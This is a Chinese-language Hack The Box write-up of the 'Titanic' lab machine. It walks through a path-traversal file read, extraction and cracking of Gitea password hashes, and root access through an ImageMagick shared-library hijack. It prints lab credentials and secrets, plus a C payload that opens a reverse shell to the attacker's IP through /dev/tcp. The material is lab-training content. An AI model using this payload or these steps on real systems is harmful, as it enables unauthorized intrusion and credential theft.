---
title: HackTheBox-Season7-Titanic
published: 2025-03-09 16:18:09
tags: [HackTheBox]
category: 靶机
draft: false
---

# Season7-Titanic

> https://app.hackthebox.com/competitive/7/overview | `esay` | 漏洞有点难找，我觉得中等左右
> 

## 前期踩点

```python
root@kali  ~/Desktop/test/test  nmap -sT -min-rate 10000 -p- 10.10.11.55  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 08:06 EST
Nmap scan report for 10.10.11.55
Host is up (0.12s latency).
Not shown: 65251 filtered tcp ports (no-response), 282 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.62 seconds
```

```python
root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p 80,22 10.10.11.55      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 08:06 EST
Nmap scan report for 10.10.11.55
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   159.22 ms 10.10.16.1
2   126.49 ms 10.10.11.55

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.79 seconds
```

```python
root@kali  ~/Desktop/test/test  nmap -script=vuln -p 80,22 10.10.11.55      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 08:08 EST
Nmap scan report for 10.10.11.55
Host is up (0.11s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 49.50 seconds
```

子域名查询，发现`dev`，添加到`hosts`里面去

```python
⚡ root@kali  ~  wfuzz -c -w ~/Desktop/Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=9 -H 'Host:FUZZ.titanic.htb' -u titanic.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://titanic.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000019:   200        275 L    1278 W     13870 Ch    "dev"                                                                                                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 147
Filtered Requests: 146
Requests/sec.: 0
```

访问`dev` ，`gitea`服务

![image.png](image.png)

访问`HTTP`服务，是关于泰塔尼克号的订票服务

![image.png](image%201.png)

点击`BookYourTrip` ，会弹出输入框，填完信息后会下载一个`Json`文件，可能存在`json`注入

![image.png](image%202.png)

并且接口是`/download?ticket=` ，可能会存在任意文件下载

![image.png](image%203.png)

扫描目录

```python
⚡ root@kali  ~  dirsearch -u http://titanic.htb -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/reports/http_titanic.htb/_25-02-20_08-19-02.txt

Target: http://titanic.htb/

[08:19:02] Starting: 
[08:19:40] 405 -  153B  - /book                                             
[08:19:51] 400 -   41B  - /download                                         
                                                                             
Task Completed

```

## 任意文件读取

上面拿到了下载文件的接口，尝试读取`/etc/passwd` ，成功读取

![image.png](image%204.png)

```python
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

根据用户信息，找到除了`root`账户以外存在有`shell`的用户，尝试读取`UserFlag` 

![image.png](image%205.png)

成功读到`userFlag` `14def493d782d069858e8dd5279ca746`

尝试读取`ssh`私钥文件，`NotFound`

![image.png](image%206.png)

## gitea

给`dev`子域名做一下信息收集

`nikto`扫描漏洞，`dev`大概是在`Docker` 搭建

```python
⚡ root@kali  ~  nikto -url http://dev.titanic.htb/                     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.55
+ Target Hostname:    dev.titanic.htb
+ Target Port:        80
+ Start Time:         2025-02-20 08:46:35 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: ARRAY(0x555859cc9d60) .
b^[[1;5D^[[1;5D+ /v2/_catalog: Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0.
```

目录扫描

```python
⚡ root@kali  ~/Desktop/Dict/SecLists-2024.3/Discovery/DNS  dirsearch -u http://dev.titanic.htb -x 403,404 -e php,zip,txt                                                                                     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/Dict/SecLists-2024.3/Discovery/DNS/reports/http_dev.titanic.htb/_25-02-20_08-48-45.txt

Target: http://dev.titanic.htb/

[08:48:45] Starting: 
[08:49:02] 200 -    1KB - /.well-known/openid-configuration
[08:49:02] 200 -  206B  - /.well-known/security.txt
[08:49:10] 303 -   38B  - /admin  ->  /user/login
[08:49:11] 303 -   38B  - /admin/  ->  /user/login
[08:49:18] 200 -   20KB - /administrator/
[08:49:18] 200 -   20KB - /administrator
[08:49:21] 200 -  433B  - /api/swagger
[08:49:35] 200 -   25KB - /developer
[08:49:39] 303 -   41B  - /explore  ->  /explore/repos
[08:49:39] 200 -   20KB - /explore/repos
[08:49:40] 301 -   58B  - /favicon.ico  ->  /assets/img/favicon.png
[08:49:49] 303 -   38B  - /issues  ->  /user/login
[08:50:17] 200 -  170B  - /sitemap.xml
[08:50:25] 200 -   11KB - /user/login/
[08:50:26] 401 -   50B  - /v2
[08:50:26] 401 -   50B  - /v2/_catalog
[08:50:26] 401 -   50B  - /v2/

Task Completed
```

访问`/.well-known/openid-configuration` 又可以找到一个子域名，再添加上`hosts`

![image.png](image%207.png)

但是访问报`No response received from remote server.`

`/.well-known/security.txt`

```python
# This site is running a Gitea instance.
# Gitea related security problems could be reported to Gitea community.
# Site related security problems should be reported to this site's admin.
Contact: https://github.com/go-gitea/gitea/blob/main/SECURITY.md
Policy: https://github.com/go-gitea/gitea/blob/main/SECURITY.md
Preferred-Languages: en
```

`/developer`

![image.png](image%208.png)

`/developer/docker-config/src/branch/main/mysql/docker-compose.yml` 能找到数据库密码`MySQLP@$$w0rd!`

```python
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

`/developer/docker-config/src/branch/main/gitea/docker-compose.yml` 

`/home/developer/gitea/data:/data`, 将容器内的数据挂在到物理机的`/home/developer/gitea/data`目录下

```python
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```

查看`gitea`官方文档 https://docs.gitea.com/zh-cn/next/administration/config-cheat-sheet ，查询到配置文件存放在`/etc/gitea/conf/app.ini` 利用任意文件读取漏洞读取

结合 `/home/developer/gitea/data:/data` 构造链接：`/home/developer/gitea/data/gitea/conf/app.ini`

```python
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

根据配置文件内容读取`gitea.db` 并下载

![image.png](image%209.png)

使用`sqlite3`打开，并且读取用表数据

```python
⚡ root@kali  ~/Desktop/test/titanic  sqlite3 gitea.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> 
sqlite> select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1740059263|1740059263|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0
3|sdgeek|sdgeek||sdgeek@hackers-home.com|0|enabled|c573bec092520ea80e109d9b6139b9743c5da3a87e10b9c4b09be90cab8597775b4706d1b003e5bd05d8fb9149d66f75eeb3|pbkdf2$50000$50|0|0|0||0|||2b4667f935725dad4735ce458d7e6763|000e6d5ed0b72df01c823d8a208709f5|en-US||1740054694|1740054694|1740054694|0|-1|1|0|0|0|0|1|0|70a933c63c214a02539f4ad8bfc2480f|sdgeek@hackers-home.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
4|johndoe|johndoe||john@mail.com|0|enabled|1d19a1d61d6c723d5b072998bd8f9148044236e18f1ce28d48152e42fd4349ce2900b16cf223cacec079c3c675e595b69485|pbkdf2$50000$50|0|0|0||0|||1cca2b09f6015581a78dbc7523a8cb1b|3c0e5ef0a6d4ef9d5b23d01c0b771693|en-US||1740056823|1740059204|1740059204|0|-1|1|0|0|0|0|1|0|97c712aa60976209ae6d1c741b1338d3|john@mail.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
```

再看表结构

```python
sqlite> pragma table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
13|type|INTEGER|0||0
14|location|TEXT|0||0
15|website|TEXT|0||0
16|rands|TEXT|0||0
17|salt|TEXT|0||0
```

我们知道靶机上存在`developer`用户，所以我们将其密码拉取下来

经查询`gitea`是使用`PBKDF2` 算法进行哈希 https://github.com/dvdknaap/gitea-crack-passwords

`50000`是迭代次数， `8bf3e3452b78544f8bee9400d6936d34`是盐值，执行爆破

```python
python ../../Tools/gitTeaPassCrack.py -s 8bf3e3452b78544f8bee9400d6936d34 -t e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 -w /usr/share/wordlists/rockyou.txt
Found password: 25282528
```

## 提权

登录`SSH`

```python
⚡ root@kali  ~/Desktop/test/titanic  ssh developer@10.10.11.55           
The authenticity of host '10.10.11.55 (10.10.11.55)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.55' (ED25519) to the list of known hosts.
developer@10.10.11.55's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Feb 20 03:23:27 PM UTC 2025

  System load:           0.03
  Usage of /:            67.6% of 6.79GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             257
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.55
  IPv6 address for eth0: dead:beef::250:56ff:feb9:dc12

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

developer@titanic:~$
```

`/opt/scripts` 下发现`identify_images.sh` (看了`WP`)

```python
developer@titanic:/opt/scripts$ ls
identify_images.sh

developer@titanic:/opt/scripts$ ls -al
total 12
drwxr-xr-x 2 root root 4096 Feb  7 10:37 .
drwxr-xr-x 5 root root 4096 Feb  7 10:37 ..
-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh

developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

遍历 `/opt/app/static/assets/images/` 目录下所有的 `.jpg` 文件，使用 `ImageMagick` 的 `identify` 命令提取它们的元数据，并将结果记录到 `metadata.log` 文件中

查看`Magick`版本

```python
developer@titanic:/opt/scripts$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)

```

意外的有漏洞

```python
⚡ root@kali  ~/Desktop/test/titanic  searchsploit ImageMagick     
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
GeekLog 2.x - 'ImageImageMagick.php' Remote File Inclusion                        | php/webapps/3946.txt
ImageMagick - Memory Leak                                                         | multiple/local/45890.sh
ImageMagick 6.8.8-4 - Local Buffer Overflow (SEH)                                 | windows/local/31688.pl
ImageMagick 6.9.3-9 / 7.0.1-0 - 'ImageTragick' Delegate Arbitrary Command Executi | multiple/local/39791.rb
ImageMagick 6.x - '.PNM' Image Decoding Remote Buffer Overflow                    | linux/dos/25527.txt
ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow                   | linux/dos/28383.txt
ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities          | multiple/dos/39767.txt
ImageMagick 7.1.0-49 - Arbitrary File Read                                        | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                        | php/dos/51256.txt
Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution (RCE) (Authenti | php/webapps/51025.txt
---------------------------------------------------------------------------------- ---------------------------------

```

搜索`POC`：https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

`POC`验证版本与靶机版本一模一样

![image.png](image%2010.png)

我们知道脚本工作路径是在`/opt/app/static/assets/images/` 我们在其目录创建一个运行库文件

```python
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.16.42/1234 0>&1'");
    exit(0);
}
EOF
```

等待脚本执行（包会执行的），拿到root权限以及`RootFlag`

![image.png](image%2011.png)